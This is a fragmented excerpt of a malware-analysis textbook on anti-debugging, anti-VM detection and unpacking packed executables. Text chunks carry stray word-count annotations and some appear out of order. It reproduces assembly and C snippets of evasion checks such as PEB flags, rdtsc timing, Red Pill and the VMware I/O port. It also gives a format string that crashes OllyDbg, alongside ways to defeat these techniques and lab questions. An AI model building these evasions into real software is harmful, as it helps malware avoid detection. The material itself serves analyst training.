being debugged. Table 16-1 shows two examples of this type of check.
[Word Count: 48]


Force the jump to be taken (or not) by manually modifying the zero flag 
immediately before the jump instruction is executed. This is the easiest 
approach.
[Word Count: 27]


Manually change the BeingDebugged flag to zero.
[Word Count: 8]

Both options are generally effective against all of the techniques 
described in this section.
[Word Count: 14]

NOTE
A number of OllyDbg plug-ins change the BeingDebugged flag for you. The most popu-
lar are Hide Debugger, Hidedebug, and PhantOm. All are useful for overcoming the 
BeingDebugged flag check and also help with many of the other techniques we discuss in 
this chapter.
[Word Count: 45]

Table 16-1: Manually Checking the BeingDebugged Flag
[Word Count: 7]

mov eax, dword ptr fs:[30h]
mov ebx, byte ptr [eax+2]
test ebx, ebx
jz NoDebuggerDetected
[Word Count: 15]

push dword ptr fs:[30h]
pop edx
cmp byte ptr [edx+2], 1
je DebuggerDetected
[Word Count: 13]

mov eax, large fs:30h
mov eax, dword ptr [eax+18h]
cmp dword ptr ds:[eax+10h], 0
jne DebuggerDetected
[Word Count: 16]

Listing 16-3: Manual ProcessHeap flag check
[Word Count: 6]

The best way to overcome this technique is to change the ProcessHeap 
flag manually or to use a hide-debug plug-in for your debugger. If you are 
using WinDbg, you can start the program with the debug heap disabled. For 
example, the command windbg –hd notepad.exe will start the heap in normal 
mode as opposed to debug mode, and the flags we’ve discussed won’t be set.
[Word Count: 65]

Since processes run slightly differently when started with a debugger, they 
create memory heaps differently. The information that the system uses to 
determine how to create heap structures is stored at an undocumented loca-
tion in the PEB at offset 0x68. If the value at this location is 0x70, we know 
that we are running in a debugger.
The value of 0x70 is a combination of the following flags when a heap is 
created by a debugger. These flags are set for the process if it is started from 
within a debugger.
[Word Count: 92]

(FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
[Word Count: 5]

Listing 16-4 shows the assembly code for performing this check.
[Word Count: 10]

mov eax, large fs:30h
cmp dword ptr ds:[eax+68h], 70h
jz DebuggerDetected
[Word Count: 11]

The easiest way to overcome this technique is to change the flags manu-
ally or with a hide-debug plug-in for your debugger. If you are using WinDbg, 
you can start the program with the debug heap option disabled, as men-
tioned in the previous section.
[Word Count: 45]

When analyzing malware, we typically use debugging tools, which leave resi-
due on the system. Malware can search for this residue in order to determine 
when you are attempting to analyze it, such as by searching registry keys for 
references to debuggers. The following is a common location for a debugger:
[Word Count: 51]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug
[Word Count: 2]

if(FindWindow("OLLYDBG", 0) == NULL)
{
//Debugger Not Found
}
else
{
//Debugger Detected
}
[Word Count: 14]

Listing 16-5: C code for FindWindow detection
[Word Count: 7]

In this example, the code simply looks for a window named OLLYDBG.
[Word Count: 12]

Recall that debuggers can be used to set breakpoints or to single-step through 
a process in order to aid the malware analyst in reverse-engineering. How-
ever, when these operations are performed in a debugger, they modify the 
code in the process. Several anti-debugging techniques are used by malware 
to detect this sort of debugger behavior: INT scanning, checksum checks, 
and timing checks.
[Word Count: 62]

call $+5
pop edi
sub edi, 5
mov ecx, 400h
mov eax, 0CCh
repne scasb
jz DebuggerDetected
[Word Count: 17]

Listing 16-6: Scanning code for breakpoints
[Word Count: 6]

This code begins with a call, followed by a pop that puts EIP into EDI. 
EDI is then adjusted to the start of the code. The code is then scanned for 
0xCC bytes. If a 0xCC byte is found, it knows that a debugger is present. This 
technique can be overcome by using hardware breakpoints instead of soft-
ware breakpoints.
[Word Count: 60]

Malware can calculate a checksum on a section of its code to accomplish the 
same goal as scanning for interrupts. Instead of scanning for 0xCC, this check 
simply performs a cyclic redundancy check (CRC) or a MD5 checksum of the 
opcodes in the malware.
This technique is less common than scanning, but it’s equally effective. 
Look for the malware to be iterating over its internal instructions followed by 
a comparison to an expected value.
This technique can be overcome by using hardware breakpoints or by 
manually modifying the execution path with the debugger at runtime.
[Word Count: 95]

Timing checks are one of the most popular ways for malware to detect 
debuggers because processes run more slowly when being debugged. For 
example, single-stepping through a program substantially slows execution 
speed.
[Word Count: 32]

There are a couple of ways to use timing checks to detect a debugger:
[Word Count: 14]


Record a timestamp, perform a couple of operations, take another time-
stamp, and then compare the two timestamps. If there is a lag, you can 
assume the presence of a debugger.
[Word Count: 32]


Take a timestamp before and after raising an exception. If a process is not 
being debugged, the exception will be handled really quickly; a debugger 
will handle the exception much more slowly. By default, most debuggers 
require human intervention in order to handle exceptions, which causes 
enormous delay. While many debuggers allow you to ignore exceptions 
and pass them to the program, there will still be a sizable delay in such 
cases.
[Word Count: 73]

The most common timing check method uses the rdtsc instruction (opcode 
0x0F31), which returns the count of the number of ticks since the last system 
reboot as a 64-bit value placed into EDX:EAX. Malware will simply execute 
this instruction twice and compare the difference between the two readings.
Listing 16-7 shows a real malware sample using the rdtsc technique.
[Word Count: 59]

rdtsc
xor ecx, ecx
add ecx, eax
rdtsc
sub eax, ecx
cmp eax, 0xFFF 
jb NoDebuggerDetected
rdtsc
push eax 
ret
[Word Count: 22]

Listing 16-7: The rdtsc timing technique
[Word Count: 6]

The malware checks to see if the difference between the two calls to rdtsc 
is greater than 0xFFF at , and if too much time has elapsed, the conditional 
jump will not be taken. If the jump is not taken, rdtsc is called again, and the 
result is pushed onto the stack at , which will cause the return to take the 
execution to a random location.
[Word Count: 67]

Using QueryPerformanceCounter and GetTickCount
[Word Count: 4]

Two Windows API functions are used like rdtsc in order to perform an anti-
debugging timing check. This method relies on the fact that processors have 
high-resolution performance counters—registers that store counts of activi-
ties performed in the processor. QueryPerformanceCounter can be called to query 
this counter twice in order to get a time difference for use in a comparison. 
If too much time has passed between the two calls, the assumption is that a 
debugger is being used.
[Word Count: 79]

The function GetTickCount returns the number of milliseconds that have 
elapsed since the last system reboot. (Due to the size allocated for this coun-
ter, it rolls over after 49.7 days.) An example of GetTickCount in practice is 
shown in Listing 16-8.
[Word Count: 42]

a = GetTickCount();
MaliciousActivityFunction();
b = GetTickCount();
[Word Count: 7]

delta = b-a;
if ((delta) > 0x1A)
{
//Debugger Detected
} 
else 
{
//Debugger Not Found
}
[Word Count: 17]

Listing 16-8: GetTickCount timing technique
[Word Count: 5]

Malware can use several techniques to interfere with normal debugger oper-
ation: thread local storage (TLS) callbacks, exceptions, and interrupt inser-
tion. These techniques try to disrupt the program’s execution only if it is 
under the control of a debugger.
[Word Count: 40]

TLS. When TLS is implemented by an executable, the code will typically con-
tain a .tls section in the PE header, as shown in Figure 16-1. TLS supports 
callback functions for initialization and termination of TLS data objects. 
Windows executes these functions before running code at the normal start 
of a program.
[Word Count: 52]

Figure 16-1: TLS callback example—a TLS table in PEview
[Word Count: 9]

Figure 16-2: Viewing a TLS callback function in IDA Pro 
(press CTRL-E to display)
[Word Count: 14]

TLS callbacks can be handled within a debugger, though sometimes 
debuggers will run the TLS callback before breaking at the initial entry 
point. To avoid this problem, change the debugger’s settings. For example, 
if you’re using OllyDbg, you can have it pause before the TLS callback by 
selecting OptionsDebugging OptionsEvents and setting System break-
point as the place for the first pause, as shown in Figure 16-3.
[Word Count: 67]

NOTE
OllyDbg 2.0 has more breaking capabilities than version 1.1; for example, it can pause 
at the start of a TLS callback. Also, WinDbg always breaks at the system breakpoint 
before the TLS callbacks.
[Word Count: 34]

Figure 16-3: OllyDbg first pause options
[Word Count: 6]

Because TLS callbacks are well known, malware uses them less frequently 
than in the past. Not many legitimate applications use TLS callbacks, so a 
.tls section in an executable can stand out.
[Word Count: 32]

Figure 16-4 shows OllyDbg’s default settings; all exceptions will be trapped 
unless the box is checked. These options are accessed via OptionsDebugging 
OptionsExceptions.
[Word Count: 23]

Figure 16-4: Ollydbg exception processing options
[Word Count: 6]

NOTE
When performing malware analysis, we recommend setting the debugging options to 
pass all of the exceptions to the program.
[Word Count: 20]

A classic form of anti-debugging is to use exceptions to annoy the analyst and 
disrupt normal program execution by inserting interrupts in the middle of a 
valid instruction sequence. Depending on the debugger settings, these inser-
tions could cause the debugger to stop, since it is the same mechanism the 
debugger itself uses to set software breakpoints.
[Word Count: 57]

Listing 16-9 shows assembly code that implements this technique. This 
example sets a new SEH and then calls INT 3 to force the code to continue.
[Word Count: 26]

push offset continue
push dword fs:[0] 
mov fs:[0], esp 
int 3
//being debugged
continue: 
//not being debugged
[Word Count: 17]

The INT 2D anti-debugging technique functions like INT 3—the INT 0x2D instruc-
tion is used to access the kernel debugger. Because INT 0x2D is the way that ker-
nel debuggers set breakpoints, the method shown in Listing 16-9 applies.
[Word Count: 39]

Like all software, debuggers contain vulnerabilities, and sometimes malware 
authors attack them in order to prevent debugging. Here, we present several 
popular vulnerabilities in the way OllyDbg handles the PE format.
[Word Count: 31]

The first technique modifies the Microsoft PE header of a binary executable, 
causing OllyDbg to crash when loading the executable. The result is an error 
of “Bad or Unknown 32-bit Executable File,” yet the program usually runs 
fine outside the debugger.
This issue is due to the fact that OllyDbg follows the Microsoft specifica-
tions regarding the PE header too strictly. In the PE header, there is typically 
a structure known as the IMAGE_OPTIONAL_HEADER. Figure 16-5 shows a subset of 
this structure.
[Word Count: 82]

Figure 16-5: PE IMAGE_OPTIONAL_HEADER and NumberOfRvaAndSizes vulnerability
[Word Count: 7]

Figure 16-6: PE IMAGE_SECTION_HEADER structure
[Word Count: 5]

Malware often attempts to exploit a format string vulnerability in version 1.1 
of OllyDbg, by providing a string of %s as a parameter to OutputDebugString to 
cause OllyDbg to crash. Beware of suspicious calls like OutputDebugString
("%s%s%s%s%s%s%s%s%s%s%s%s%s%s"). If this call executes, your debugger will 
crash.
[Word Count: 45]

This chapter introduced you to some popular anti-debugging techniques. 
It takes patience and perseverance to learn to recognize and bypass anti-
debugging techniques. Be sure to take notes during your analysis and 
remember the location of any anti-debugging techniques and how you 
bypass them; doing so will help you if you need to restart the debugging 
process.
Most anti-debugging techniques can be spotted using common sense, 
while debugging a process slowly. For example, if you see code terminating 
prematurely at a conditional jump, that might hint at an anti-debugging
[Word Count: 89]

Location to virtually 
load this section
[Word Count: 6]

technique. Most popular anti-debugging techniques involve accessing 
fs:[30h], calling a Windows API call, or performing a timing check.
Of course, as with all malware analysis, the best way to learn to thwart 
anti-debugging techniques is by continuing to reverse and study malware. 
Malware authors are always looking for new ways to thwart debuggers and 
to keep malware analysts like you on your toes.
[Word Count: 63]

Analyze the malware found in Lab16-01.exe using a debugger. This is the 
same malware as Lab09-01.exe, with added anti-debugging techniques.
[Word Count: 20]

1.
Which anti-debugging techniques does this malware employ?
[Word Count: 8]

2.
What happens when each anti-debugging technique succeeds?
[Word Count: 8]

3.
How can you get around these anti-debugging techniques?
[Word Count: 9]

4.
How do you manually change the structures checked during runtime?
[Word Count: 11]

5.
Which OllyDbg plug-in will protect you from the anti-debugging tech-
niques used by this malware?
[Word Count: 16]

Analyze the malware found in Lab16-02.exe using a debugger. The goal of this 
lab is to figure out the correct password. The malware does not drop a mali-
cious payload.
[Word Count: 30]

1.
What happens when you run Lab16-02.exe from the command line?
[Word Count: 11]

2.
What happens when you run Lab16-02.exe and guess the command-line 
parameter?
[Word Count: 12]

4.
Load Lab16-02.exe into IDA Pro. Where in the main function is strncmp 
found?
[Word Count: 14]

5.
What happens when you load this malware into OllyDbg using the 
default settings?
[Word Count: 14]

6.
What is unique about the PE structure of Lab16-02.exe?
[Word Count: 10]

7.
Where is the callback located? (Hint: Use CTRL-E in IDA Pro.)
[Word Count: 12]

8.
Which anti-debugging technique is the program using to terminate 
immediately in the debugger and how can you avoid this check?
[Word Count: 21]

9.
What is the command-line password you see in the debugger after you 
disable the anti-debugging technique?
[Word Count: 17]

10. Does the password found in the debugger work on the command line?
[Word Count: 13]

11. Which anti-debugging techniques account for the different passwords in 
the debugger and on the command line, and how can you protect 
against them?
[Word Count: 24]

Analyze the malware in Lab16-03.exe using a debugger. This malware is simi-
lar to Lab09-02.exe, with certain modifications, including the introduction of 
anti-debugging techniques. If you get stuck, see Lab 9-2.
[Word Count: 31]

1.
Which strings do you see when using static analysis on the binary?
[Word Count: 13]

2.
What happens when you run this binary?
[Word Count: 8]

3.
How must you rename the sample in order for it to run properly?
[Word Count: 14]

4.
Which anti-debugging techniques does this malware employ?
[Word Count: 8]

5.
For each technique, what does the malware do if it determines it is 
running in a debugger?
[Word Count: 18]

6.
Why are the anti-debugging techniques successful in this malware?
[Word Count: 10]

7.
What domain name does this malware use?
[Word Count: 8]

A N T I - V I R T U A L  M A C H I N E  
T E C H N I Q U E S
[Word Count: 29]

Malware authors sometimes use anti-virtual machine 
(anti-VM) techniques to thwart attempts at analysis. 
With these techniques, the malware attempts to detect 
whether it is being run inside a virtual machine. If a 
virtual machine is detected, it can act differently or 
simply not run. This can, of course, cause problems 
for the analyst.
[Word Count: 53]

machine does not necessarily mean that it isn’t a valuable victim. As virtual-
ization continues to grow, anti-VM techniques will probably become even less 
common.
Because anti-VM techniques typically target VMware, in this chapter, 
we’ll focus on anti-VMware techniques. We’ll examine the most common 
techniques and how to defeat them by tweaking a couple of settings, remov-
ing software, or patching an executable.
[Word Count: 63]

The VMware environment leaves many artifacts on the system, especially 
when VMware Tools is installed. Malware can use these artifacts, which are 
present in the filesystem, registry, and process listing, to detect VMware.
For example, Figure 17-1 shows the process listing for a standard VMware 
image with VMware Tools installed. Notice that three VMware processes are 
running: VMwareService.exe, VMwareTray.exe, and VMwareUser.exe. Any one 
of these can be found by malware as it searches the process listing for the 
VMware string.
[Word Count: 80]

Figure 17-1: Process listing on a VMware image with 
VMware Tools running
[Word Count: 12]

VMwareService.exe runs the VMware Tools Service as a child of services.exe. 
It can be identified by searching the registry for services installed on a machine 
or by listing services using the following command:
[Word Count: 33]

VMware Physical Disk Helper Service
     VMware Tools Service
[Word Count: 8]

The VMware installation directory C:\Program Files\VMware\VMware Tools 
may also contain artifacts, as can the registry. A quick search for “VMware” 
in a virtual machine’s registry might find keys like the following, which are 
entries that include information about the virtual hard drive, adapters, and 
virtual mouse.
[Word Count: 46]

[HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0]
"Identifier"="VMware Virtual IDE Hard Drive"
"Type"="DiskPeripheral"
[Word Count: 16]

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0000]
"DeviceDesc"="VMware Accelerated AMD PCNet Adapter"
"DisplayName"="VMware Accelerated AMD PCNet Adapter"
"Mfg"="VMware, Inc."
"ProviderName"="VMware, Inc."
[Word Count: 15]

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E96F-E325-11CE-BFC1-08002BE10318}\0000]
"LocationInformationOverride"="plugged into PS/2 mouse port"
"InfPath"="oem13.inf"
"InfSection"="VMMouse"
"ProviderName"="VMware, Inc."
[Word Count: 10]

You may also be able to prevent malware from searching for artifacts. 
For example, if you find a single VMware-related string in malware—such as 
net start | findstr VMware, VMMouse, VMwareTray.exe, or VMware Virtual IDE Hard 
Drive—you know that the malware is attempting to detect VMware artifacts. 
You should be able to find this code easily in IDA Pro using the references 
to the strings. Once you find it, patch it to avoid detection while ensuring 
that the malware will function properly.
[Word Count: 82]

Defeating malware that searches for VMware artifacts is often a simple two-
step process: identify the check and then patch it. For example, say we run 
strings against the malware vmt.exe. We notice that the binary contains the 
string "VMwareTray.exe", and we discover a cross-reference from the code 
to this string. We follow this cross-reference to 0x401098, as shown in the 
disassembly in Listing 17-1 at .
[Word Count: 67]

004010C0 loc_4010C0:         ; CODE XREF: sub_401000+A5j
004010C0        push 0          ; Code
004010C2        call ds:exit
[Word Count: 14]

Listing 17-1: Disassembly snippet from vmt.exe showing VMware artifact detection
[Word Count: 10]

Analyzing this code further, we notice that it is scanning the process list-
ing with functions like CreateToolhelp32Snapshot, Process32Next, and so on. The 
strncmp at  is comparing the VMwareTray.exe string with the result of convert-
ing processentry32.szExeFile to ASCII to determine if the process name is in 
the process listing. If VMwareTray.exe is discovered in the process listing, the 
program will immediately terminate, as seen at 0x4010c2. 
There are a couple of ways to avoid this detection:
[Word Count: 78]


Patch the binary while debugging so that the jump at 0x4010a5 will 
never be taken.
[Word Count: 16]


Use a hex editor to modify the VMwareTray.exe string to read XXXareTray.exe 
to make the comparison fail since this is not a valid process string.
[Word Count: 26]


Uninstall VMware Tools so that VMwareTray.exe will no longer run.
[Word Count: 11]

VMware leaves many artifacts in memory as a result of the virtualization pro-
cess. Some are critical processor structures, which, because they are either 
moved or changed on a virtual machine, leave recognizable footprints. 
One technique commonly used to detect memory artifacts is a search 
through physical memory for the string VMware, which we have found may 
detect several hundred instances.
[Word Count: 61]

The virtual machine monitor program monitors the virtual machine’s execu-
tion. It runs on the host operating system to present the guest operating sys-
tem with a virtual platform. It also has a couple of security weaknesses that 
can allow malware to detect virtualization.
[Word Count: 44]

NOTE
The x86 instruction-related issues in virtual machines discussed in this section were 
originally outlined in the USENIX 2000 paper “Analysis of the Intel Pentium’s Ability 
to Support a Secure Virtual Machine Monitor” by John Robin and Cynthia Irvine.
[Word Count: 39]

In kernel mode, VMware uses binary translation for emulation. Certain 
privileged instructions in kernel mode are interpreted and emulated, so they 
don’t run on the physical processor. Conversely, in user mode, the code runs 
directly on the processor, and nearly every instruction that interacts with 
hardware is either privileged or generates a kernel trap or interrupt. VMware 
catches all the interrupts and processes them, so that the virtual machine still 
thinks it is a regular machine.
[Word Count: 76]

Red Pill is an anti-VM technique that executes the sidt instruction to grab the 
value of the IDTR register. The virtual machine monitor must relocate the 
guest’s IDTR to avoid conflict with the host’s IDTR. Since the virtual machine 
monitor is not notified when the virtual machine runs the sidt instruction, 
the IDTR for the virtual machine is returned. The Red Pill tests for this dis-
crepancy to detect the usage of VMware.
Listing 17-2 shows how Red Pill might be used by malware.
[Word Count: 84]

push    ebp
mov     ebp, esp
sub     esp, 454h
push    ebx
push    esi
[Word Count: 12]

push    edi
push    8               ; Size
push    0               ; Val
lea     eax, [ebp+Dst]
push    eax             ; Dst
call    _memset
add     esp, 0Ch
lea     eax, [ebp+Dst]
 sidt    fword ptr [eax]
mov     al, [eax+5]
cmp     al, 0FFh
jnz     short loc_401E19
[Word Count: 39]

Perhaps the most popular anti-VMware technique currently in use is that of 
querying the I/O communication port. This technique is frequently encoun-
tered in worms and bots, such as the Storm worm and Phatbot.
VMware uses virtual I/O ports for communication between the virtual 
machine and the host operating system to support functionality like copy 
and paste between the two systems. The port can be queried and compared 
with a magic number to identify the use of VMware.
[Word Count: 78]

004014FA        push    eax
004014FB        push    ebx
004014FC        push    ecx
004014FD        push    edx
004014FE        mov     eax, 'VMXh' 
00401503        mov     ebx, [ebp+var_1C]
00401506        mov     ecx, 0xA
00401509        mov     dx, 'VX' 
0040150E        in      eax, dx
0040150F        mov     [ebp+var_24], eax
00401512        mov     [ebp+var_1C], ebx
00401515        mov     [ebp+var_20], ecx
00401518        mov     [ebp+var_28], edx
...
0040153E        mov     eax, [ebp+var_1C]
00401541        cmp     eax, 'VMXh' 
00401546        jnz     short loc_40155C
[Word Count: 64]

Listing 17-3: Phatbot’s VMware detection
[Word Count: 5]

The easiest way to overcome this technique is to NOP-out the in instruc-
tion or to patch the conditional jump to allow it regardless of the outcome of 
the comparison.
[Word Count: 30]

We’ve just reviewed the most common instructions used by malware to 
employ anti-VM techniques. These instructions are as follows:
[Word Count: 19]


in (with the second operand set to VX)
[Word Count: 9]

Malware will not typically run these instructions unless it is performing 
VMware detection, and avoiding this detection can be as easy as patching the 
binary to avoid calling these instructions. These instructions are basically use-
less if executed in user mode, so if you see them, they’re likely part of anti-
VMware code. VMware describes roughly 20 instructions as “not virtualiz-
able,” of which the preceding are the most commonly used by malware.
[Word Count: 73]

Figure 17-2: The str anti-VM technique in SNG.exe
[Word Count: 8]

from idautils import *
from idc import *
[Word Count: 8]

heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))
antiVM = []
for i in heads:
  if (GetMnem(i) == "sidt" or GetMnem(i) == "sgdt" or GetMnem(i) == "sldt" or 
GetMnem(i) == "smsw" or GetMnem(i) == "str" or GetMnem(i) == "in" or 
GetMnem(i) == "cpuid"):
    antiVM.append(i)
print "Number of potential Anti-VM instructions: %d" % (len(antiVM))
for i in antiVM:
  SetColor(i, CIC_ITEM, 0x0000ff)
[Word Count: 56]

Listing 17-4: IDA Pro script to find anti-VM instructions
[Word Count: 9]

ScoopyNG (http://www.trapkit.de/) is a free VMware detection tool that 
implements seven different checks for a virtual machine, as follows:
[Word Count: 19]


The first three checks look for the sidt, sgdt, and sldt (Red Pill and 
No Pill) instructions.
[Word Count: 18]


The fifth and sixth use the backdoor I/O port 0xa and 0x14 options, 
respectively.
[Word Count: 15]


The seventh check relies on a bug in older VMware versions running in 
emulation mode.
[Word Count: 16]

For a disassembled version of ScoopyNG’s fourth check, see Figure 17-2.
[Word Count: 11]

We have discussed a number of ways to thwart VMware detection throughout 
this chapter, including patching code, removing VMware Tools, changing 
VMware settings, and using a multiprocessor machine. 
There are also a number of undocumented features in VMware that can 
help mitigate anti-VMware techniques. For example, placing the options in 
Listing 17-5 into the virtual machine’s .vmx file will make the virtual machine 
less detectable.
[Word Count: 65]

isolation.tools.getPtrLocation.disable = "TRUE"
isolation.tools.setPtrLocation.disable = "TRUE"
isolation.tools.setVersion.disable = "TRUE"
isolation.tools.getVersion.disable = "TRUE"
monitor_control.disable_directexec = "TRUE"
monitor_control.disable_chksimd = "TRUE"
monitor_control.disable_ntreloc = "TRUE"
monitor_control.disable_selfmod = "TRUE"
monitor_control.disable_reloc = "TRUE"
monitor_control.disable_btinout = "TRUE"
monitor_control.disable_btmemspace = "TRUE"
monitor_control.disable_btpriv = "TRUE"
monitor_control.disable_btseg = "TRUE"
[Word Count: 39]

Listing 17-5: VMware’s .vmx file undocumented options used to thwart anti-VM techniques
[Word Count: 12]

exhausted all other techniques. These techniques have been mentioned for 
completeness, but modifying a .vmx file to try to catch ten of the potentially 
hundreds of ways that VMware might be detected can be a bit of a wild-goose 
chase.
[Word Count: 40]

Analyze the malware found in Lab17-01.exe inside VMware. This is the same 
malware as Lab07-01.exe, with added anti-VMware techniques.
[Word Count: 19]

NOTE
The anti-VM techniques found in this lab may not work in your environment.
[Word Count: 14]

1.
What anti-VM techniques does this malware use?
[Word Count: 8]

2.
If you have the commercial version of IDA Pro, run the IDA Python 
script from Listing 17-4 in Chapter 17 (provided here as findAntiVM.py). 
What does it find?
[Word Count: 29]

3.
What happens when each anti-VM technique succeeds?
[Word Count: 8]

4.
Which of these anti-VM techniques work against your virtual machine?
[Word Count: 11]

5.
Why does each anti-VM technique work or fail?
[Word Count: 9]

6.
How could you disable these anti-VM techniques and get the malware 
to run?
[Word Count: 14]

Analyze the malware found in the file Lab17-02.dll inside VMware. After 
answering the first question in this lab, try to run the installation exports 
using rundll32.exe and monitor them with a tool like procmon. The following 
is an example command line for executing the DLL:
[Word Count: 45]

rundll32.exe Lab17-02.dll,InstallRT (or InstallSA/InstallSB)
[Word Count: 4]

2.
What happens after the attempted installation using rundll32.exe?
[Word Count: 9]

3.
Which files are created and what do they contain?
[Word Count: 10]

5.
How could you force the malware to install during runtime?
[Word Count: 11]

6.
How could you permanently disable the anti-VM technique?
[Word Count: 9]

7.
How does each installation export function work?
[Word Count: 8]

Analyze the malware Lab17-03.exe inside VMware. This lab is similar to 
Lab12-02.exe, with added anti-VMware techniques.
[Word Count: 16]

1.
What happens when you run this malware in a virtual machine?
[Word Count: 12]

2.
How could you get this malware to run and drop its keylogger?
[Word Count: 13]

3.
Which anti-VM techniques does this malware use?
[Word Count: 8]

4.
What system changes could you make to permanently avoid the anti-VM 
techniques used by this malware?
[Word Count: 17]

5.
How could you patch the binary in OllyDbg to force the anti-VM tech-
niques to permanently fail?
[Word Count: 18]


Unpacks the original executable into memory
[Word Count: 7]


Resolves all of the imports of the original executable
[Word Count: 10]


Transfers execution to the original entry point (OEP)
[Word Count: 9]

When regular executables load, a loader reads the PE header on the disk, 
and allocates memory for each of the executable’s sections based on that 
header. The loader then copies the sections into the allocated spaces in 
memory.
[Word Count: 38]

Packed executables also format the PE header so that the loader will allo-
cate space for the sections, which can come from the original program, or 
the unpacking stub can create the sections. The unpacking stub unpacks the 
code for each section and copies it into the space that was allocated. The 
exact unpacking method used depends on the goals of the packer, and it is 
generally contained within the stub.
[Word Count: 71]

Once the unpacking stub is complete, it must transfer execution to the OEP. 
The instruction that transfers execution to the OEP is commonly referred to 
as the tail jump.
A jump instruction is the simplest and most popular way to transfer execu-
tion. Since it’s so common, many malicious packers will attempt to obscure 
this function by using a ret or call instruction. Sometimes the tail jump 
is obscured with OS functions that transfer control, such as NtContinue or 
ZwContinue.
[Word Count: 80]

Figures 18-1 through 18-4 illustrate the packing and unpacking process, as 
follows:
[Word Count: 12]


Figure 18-1 shows the original executable. The header and sections are 
visible, and the starting point is set to the OEP.
[Word Count: 22]


Figure 18-2 shows the packed executable as it exists on disk. All that is vis-
ible is the new header, the unpacking stub, and packed original code.
[Word Count: 28]


Figure 18-3 shows the packed executable as it exists when it’s loaded into 
memory. The unpacking stub has unpacked the original code, and valid 
.text and .data sections are visible. The starting point for the executable 
still points to the unpacking stub, and the import table is usually not 
valid at this stage.
[Word Count: 54]


Figure 18-4 shows the fully unpacked executable. The import table has 
been reconstructed, and the starting point has been edited to point to 
the OEP.
[Word Count: 26]

Note that the final unpacked program is different than the original pro-
gram. The unpacked program still has the unpacking stub and any other 
code that the packing program added. The unpacking program has a PE 
header that has been reconstructed by the unpacker and will not be exactly 
the same as the original program.
[Word Count: 55]

Figure 18-1: The original executable, 
prior to packing
Figure 18-2: The packed executable, 
after the original code is packed and 
the unpacking stub is added
[Word Count: 25]

An early step when analyzing malware is to recognize that it is packed. We 
have covered techniques for detecting if malware is packed in earlier chap-
ters. Here, we’ll provide a review and also introduce a new technique.
[Word Count: 38]

The following list summarizes signs to look for when determining whether 
malware is packed.
[Word Count: 14]


The program has few imports, and particularly if the only imports are 
LoadLibrary and GetProcAddress.
[Word Count: 16]


When the program is opened in IDA Pro, only a small amount of code is 
recognized by the automatic analysis.
[Word Count: 21]


When the program is opened in OllyDbg, there is a warning that the pro-
gram may be packed.
[Word Count: 19]


The program shows section names that indicate a particular packer 
(such as UPX0).
[Word Count: 14]


The program has abnormal section sizes, such as a .text section with a 
Size of Raw Data of 0 and Virtual Size of nonzero.
[Word Count: 25]

Packer-detection tools such as PEiD can also be used to determine if an 
executable is packed.
[Word Count: 16]

Packed executables can also be detected via a technique known as entropy 
calculation. Entropy is a measure of the disorder in a system or program, and 
while there is not a well-defined standard mathematical formula for calculat-
ing entropy, there are many well-formed measures of entropy for digital data.
[Word Count: 49]

Figure 18-3: The program after being 
unpacked and loaded into memory. The 
unpacking stub unpacks everything neces-
sary for the code to run. The program’s 
starting point still points to the unpacking 
stub, and there are no imports.
[Word Count: 38]

Figure 18-4: The fully unpacked 
program. The import table is 
reconstructed, and the starting 
point is back to the original entry 
point (OEP).
[Word Count: 23]

Compressed or encrypted data more closely resembles random data, 
and therefore has high entropy; executables that are not encrypted or com-
pressed have lower entropy.
Automated tools for detecting packed programs often use heuristics like 
entropy. One such free automated tool is Mandiant Red Curtain, which cal-
culates a threat score for any executable using measures such as entropy. Red 
Curtain can scan a filesystem for suspected packed binaries.
[Word Count: 69]

Sometimes, packed malware can be unpacked automatically by an existing 
program, but more often it must be unpacked manually. Manual unpacking 
can sometimes be done quickly, with minimal effort; other times it can be a 
long, arduous process.
There are two common approaches to manually unpacking a program:
[Word Count: 48]


Discover the packing algorithm and write a program to run it in reverse. 
By running the algorithm in reverse, the program undoes each of the 
steps of the packing program. There are automated tools that do this, 
but this approach is still inefficient, since the program written to unpack 
the malware will be specific to the individual packing program used. So, 
even with automation, this process takes a significant amount of time to 
complete.
[Word Count: 75]


Run the packed program so that the unpacking stub does the work for 
you, and then dump the process out of memory, and manually fix up the 
PE header so that the program is complete. This is the more efficient 
approach.
[Word Count: 42]

NOTE
OllyDump, a plug-in for OllyDbg, has two good features for unpacking: It can 
dump the memory of the current process, and it can search for the OEP for a packed 
executable.
[Word Count: 32]


The import table must be reconstructed.
[Word Count: 7]


The entry point in the PE header must point to the OEP.
[Word Count: 13]

Rebuilding the Import Table with Import Reconstructor
[Word Count: 7]

Malicious packers often include call functions that do not return in an 
effort to confuse the analyst and the debugger. The step-into option steps 
into each call function, so it’s more likely to find the OEP, but also more 
likely to produce false positives. In practice you should try both the step-over 
and the step-into methods.
[Word Count: 56]

00416C31   PUSH EDI
00416C32   CALL EBP
00416C34   POP EAX
00416C35   POPAD
00416C36   LEA EAX,DWORD PTR SS:[ESP-80]
00416C3A   PUSH 0
00416C3C   CMP ESP,EAX
00416C3E   JNZ SHORT Sample84.00416C3A
00416C40   SUB ESP,-80
00416C43 JMP Sample84.00401000
00416C48   DB 00
00416C49   DB 00
00416C4A   DB 00
00416C4B   DB 00
00416C4C   DB 00
00416C4D   DB 00
00416C4E   DB 00
[Word Count: 53]

where the jump goes. Normally, jumps are within the same function, and 
IDA Pro will draw an arrow to the target of a jmp instruction. In the case of 
a tail jump, IDA Pro encounters an error and colors the jump red.
[Word Count: 42]

Figure 18-5: A tail jump is highlighted in red in the IDA Pro graph view.
[Word Count: 15]

The tail jump transfers execution to the original program, which is 
packed on disk. Therefore, the tail jump goes to an address that does not 
contain valid instructions when the unpacking stub starts, but does contain 
valid instructions when the program is running. Listing 18-2 shows the dis-
assembly at the address of the jump target when the program is loaded in 
OllyDbg. The instruction ADD BYTE PTR DS:[EAX],AL corresponds to two 0x00 
bytes, which is not a valid instruction, but OllyDbg is attempting to disassemble 
this instruction anyway.
[Word Count: 89]

00401000   ADD BYTE PTR DS:[EAX],AL
00401002   ADD BYTE PTR DS:[EAX],AL
